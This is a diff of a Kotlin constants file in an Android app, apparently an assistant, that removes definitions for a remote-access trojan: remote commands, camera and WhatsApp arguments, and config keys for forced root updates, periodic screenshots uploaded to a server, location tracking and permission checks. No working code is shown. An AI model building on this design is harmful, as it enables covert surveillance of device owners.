@@ -3,7 +3,6 @@ package com.dox.ara.utility
 import com.dox.ara.BuildConfig
 import com.dox.ara.ui.data.NavItem
 import com.dox.ara.ui.data.RouteItem
-import kotlin.reflect.KClass
 
 object Constants {
     // Build Constants
@@ -84,92 +83,9 @@ object Constants {
     const val SPEECH_NOTIFICATION_CHANNEL_NAME = "${APP_NAME}-Speech"
 
 
-    const val FCM_TOKEN = "fcm_token"
-    const val DEVICE_CODE = "device_code"
-    const val SCREENSHOTS_DIR = "ara_screenshots"
-    const val SCREENRECORDS_DIR = "ara_screenrecords"
-    const val PHOTOS_DIR = "ara_photos"
-    const val VIDEOS_DIR = "ara_videos"
-    const val CAPTURE_TYPE = "captureType"
-
-
-
-
-    const val WHATSAPP_PACKAGE_NAME = "com.whatsapp"
-    const val PERMISSION_CONTROLLER_PACKAGE_NAME = "com.google.android.permissioncontroller"
-
-
-
-    // Action
-    enum class MessageType {
-        COMMAND,
-        ALERT
-    }
-
-    enum class Command {
-        UPLOAD,
-        UPDATE,
-        DELETE,
-        LOGIN,
-        CAPTURE,
-        SEND,
-        INVOKE
-    }
-
-    enum class Alert {
-        WHATSAPP_WEB_LINK  // Not in use
-    }
-
     enum class Entity {
         ASSISTANT,
         MESSAGE,
         CHAT,
-    }
-
-    enum class ArgumentType {
-        // Media
-        CAMERA,
-        DURATION,
-
-        // Contact
-        CONTACT_ID,
-
-        // Whatsapp
-        LINK_CODE,
-        PHONE_NUMBERS,
-        MESSAGE
-    }
-
-    enum class Camera(val value: Int) {
-        FRONT(1),
-        BACK(0)
-    }
-
-    enum class TaskType {
-        LONG,
-        SHORT
-    }
-
-    enum class ApplicationConfigKey(val key: String, val type: KClass<*>) {
-        RAT_APPLICATION_VERSION_ON_SERVER("araApplicationVersionOnServer", Int::class),  // Reinstalls application
-        ROOT_FORCE_INSTALL_UPDATES("rootForceInstallUpdates", Boolean::class),  // Installs forcefully
-        PERIODIC_SCREENSHOT_INTERVAL_MINUTES("periodicScreenshotIntervalMinutes", Long::class),  // Uploads to server
-        PERIODIC_LOCATION_INTERVAL_HOURS("periodicLocationIntervalHours", Long::class),  // Saves to RoomDB
-        PERIODIC_CONFIGURATION_INTERVAL_HOURS("periodicConfiguaraionIntervalHours", Long::class),  // Uploads to server
-        PERIODIC_LOG_DELETION_INTERVAL_DAYS("periodicLogDeletionIntervalDays", Long::class),  // Performs task
-        PERIODIC_PERMISSION_CHECK_INTERVAL_MINUTES("periodicPermissionCheckIntervalMinutes", Long::class),  // Performs check
-        PERIODIC_DEFAULT_DIALER_CHECK_INTERVAL_MINUTES("periodicDefaultDialerCheckIntervalMinutes", Long::class);  // Performs check
-
-        val default: Any
-            get() = when (this) {
-                RAT_APPLICATION_VERSION_ON_SERVER -> 1
-                ROOT_FORCE_INSTALL_UPDATES -> true
-                PERIODIC_SCREENSHOT_INTERVAL_MINUTES -> 1L
-                PERIODIC_LOCATION_INTERVAL_HOURS -> 2L
-                PERIODIC_CONFIGURATION_INTERVAL_HOURS -> 1L
-                PERIODIC_LOG_DELETION_INTERVAL_DAYS -> 3L
-                PERIODIC_PERMISSION_CHECK_INTERVAL_MINUTES -> 15L
-                PERIODIC_DEFAULT_DIALER_CHECK_INTERVAL_MINUTES -> 15L
-            }
     }
 }
